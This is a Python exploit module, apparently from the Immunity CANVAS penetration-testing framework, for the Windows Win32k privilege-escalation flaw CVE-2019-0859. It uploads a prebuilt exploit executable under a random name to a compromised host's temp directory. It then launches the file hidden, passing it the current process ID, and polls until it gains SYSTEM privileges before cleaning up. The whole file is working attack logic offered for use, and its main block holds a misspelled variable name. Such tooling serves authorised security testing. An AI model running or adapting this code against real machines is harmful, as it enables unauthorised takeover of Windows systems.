#!/usr/bin/env python
##ImmunityHeader v1
################################################################################
## File       :  setwindowfnid_lpe.py
## Description:  An elevation of privilege vulnerability exists when Windows
##               improperly handles calls to win32k!xxxCreateWindowEx
## Created_On :  Mon March 26 2020
## Created_By :  Nox
##
## (c) Copyright 2020, Immunity, Inc. all rights reserved.
################################################################################

import os
import sys
import time
import random
import logging

if "." not in sys.path:
    sys.path.append(".")

import canvasengine
from exploitutils import *
from libs.canvasos import canvasos
from libs.node_utils import update_graph_node

from ExploitTypes.windowsLocalExploit import WindowsLocalExploit
from ExploitTypes.localexploit import LocalExploit

NAME                            = "Menu Confusion LPE"
DESCRIPTION                     = "An elevation of privilege vulnerability exists in Windows when the Win32k component fails to properly handle objects in memory."

DOCUMENTATION                   = {}
DOCUMENTATION["VENDOR"]         = "Microsoft"
DOCUMENTATION["CVE Name"]       = "CVE-2019-0859"
DOCUMENTATION["CVE Url"]        = "https://nvd.nist.gov/vuln/detail/CVE-2019-0859"
DOCUMENTATION["CVSS"]           = 7.8
DOCUMENTATION["Notes"]          = """
Tested:
- Windows 7 x64
- Windows 8.1 x64

Untested:
- Windows 10 x64 1607

NOTE: It should work on Windows 10 x64 1607 but it is untested
"""

VERSION                         = "1.0"
PROPERTY                        = {}
PROPERTY['TYPE']                = 'Exploit'
PROPERTY['SITE']                = 'Local'
PROPERTY['ARCH']                = [["Windows", "x64"]]
PROPERTY['VERSION']             = ['7', '8.1']
PROPERTY['MS PATCHES']          = ['KB4493448', 'KB4493472', 'KB4493446', 'KB4493467']

class theexploit(WindowsLocalExploit):
    def __init__(self):
        WindowsLocalExploit.__init__(self)
        self.node           = None
        self.name           = NAME
        self.local_path     = os.path.dirname(__file__)
        self.binaries_path  = os.path.join(self.local_path, "Resources")

    def write_file_remote(self, winver):
        t_os = canvasos('WINDOWS')
        t_os.arch = "x64" if (self.is_64bit_node() or self.has_wow64()) else "x86"

        xpl_orig_name = "exploit"+winver+"_x86.exe"
        if t_os.arch == "x64":
            xpl_orig_name = "exploit"+winver+"_x64.exe"

        local_exploit_path = os.path.join(self.binaries_path, xpl_orig_name)

        tmp_path = self.node.shell.GetTempPathA()
        if not tmp_path:
            logging.error("Could not resolve full temp directory path")
            return False
        else:
            logging.info("Temp directory: %s" % tmp_path)

        if self.node.shell.chdir(tmp_path) < 0:
            logging.error("Could not chdir into %s" % tmp_path)
            return False

        remote_exploit_name = "%s.exe" % random.randint(10001, 99999)
        remote_exploit_path = tmp_path + remote_exploit_name

        if not self.nodeUpload(local_exploit_path, remote_exploit_path):
            logging.error("Failed to upload the EXE")
            return False

        return remote_exploit_path

    def spawn_process(self, path, pid):
        logging.info("Spawning exploit: %s" % path)

        try:
            cmd_line = path + " " + pid
            ret = self.node.shell.CreateProcessA(cmd_line,
                                                 inherithandles = 0,
                                                 dwCreationFlags = 0x08000000)
            return True
        except Exception, ex:
            self.log_error("%s" % ex)
            return False

    def get_releaseid(self):
        from WindowsConstants import KEY_QUERY_VALUE
        from WindowsConstants import HKEY_LOCAL_MACHINE
        from WindowsConstants import GENERIC_WRITE

        RELEASEID_KEY = "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion"
        hKey = self.node.shell.get_reg_key_handle(HKEY_LOCAL_MACHINE, RELEASEID_KEY, KEY_QUERY_VALUE)
        value = self.node.shell.RegQueryValueEx(hKey, "ReleaseID")[2]
        releaseid = int(str(value).strip('\0'))

        return releaseid

    def run(self):
        ret = 0
        for node in self.argsDict['passednodes']:
            self.node = node
            if not self.is_windows_node():
                continue

            name = ""
            if (self.is_win7_node() or self.is_win2012_node()):
                name = "_w7"
            elif (self.is_win81_node() or self.is_win2012r2_node()):
                name = "_w81"
            elif (self.is_win10_node() or self.is_win2016_node()):
                name = "_w10"
                if self.get_releaseid() != 1607:
                    logging.warning("Only Windows 10 1607 is supported")
                    continue
            else:
                logging.warning("Not Windows version supported")
                continue

            if not (self.has_wow64() or self.is_64bit_node()):
                logging.warning("Only support x64 arch")
                continue

            if self.compromised():
                logging.warning("It appears you are already running as LOCAL/SYSTEM")
                continue

            path = self.write_file_remote(name)
            if path == False:
                return False

            pid  = self.node.shell.getpid()
            arg1 = "%s" % pid
            logging.info("PID: %s" % pid)
            if not self.spawn_process(path, arg1):
                logging.critical('Could not spawn %s' % NAME)
                return False

            isSystem = False
            for i in range(0, 20):
                if self.compromised():
                    update_graph_node(node, self.engine, self.node.shell.whoami())
                    isSystem = True
                    break
                time.sleep(3)

            time.sleep(3)

            self.add_file_for_cleanup(path)

            if not isSystem:
                logging.error("Fail %s to get SYSTEM privileges" % NAME)
                logging.error("Probably the target is not vulnerable")
                return False
            ret += 1
        return ret


if __name__ == '__main__':
    logging.info("Running CANVAS %s Exploit v%s" % (DESCRIPION, VERSION))
    app = theexploit()
    ret = standard_callback_commandline(app)
